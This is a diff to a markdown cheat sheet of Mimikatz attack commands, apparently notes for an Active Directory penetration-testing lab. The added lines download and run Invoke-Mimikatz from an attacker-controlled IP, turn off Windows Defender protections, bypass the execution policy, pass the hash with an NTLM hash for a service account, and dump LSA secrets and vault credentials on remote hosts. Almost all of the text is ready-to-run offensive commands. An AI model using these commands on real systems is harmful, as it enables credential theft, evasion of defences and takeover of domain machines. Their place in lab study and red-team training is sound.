@@ -1,7 +1,32 @@
 # Mimikatz
 
 Invoke-Mimikatz commands:
- - Interesting credentials such as those set for Scheduled Tasks are stored in the Credential Vault. These can be extracted using:
+
+ - Upload Mimikatz from attacker machine, then run via PSRemoting (requires local admin) and dump the hashes
+```
+iex (iwr http://172.16.100.X/Invoke-Mimikatz.ps1 -UseBasicParsing)
+$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
+# Disable AMSI
+Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
+Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
+```
+
+ - Over Pass the Hash using an NTLM hash (run from elevated PowerShell)
+```
+# Disable AV
+Set-MpPreference -DisableRealtimeMonitoring $true
+# Bypass EP
+powershell -ep bypass
+# Load Mimikatz
+. .\Invoke-Mimikatz.ps1
+# Over pass the hash
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
+# Check privileges
+ls \\$domaincontroller\c$
+Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName $dc
+```
+
+- Interesting credentials such as those set for Scheduled Tasks are stored in the Credential Vault. These can be extracted using:
 `Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'`
  - Dump hashes on target machines
 `Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <targetserver>`
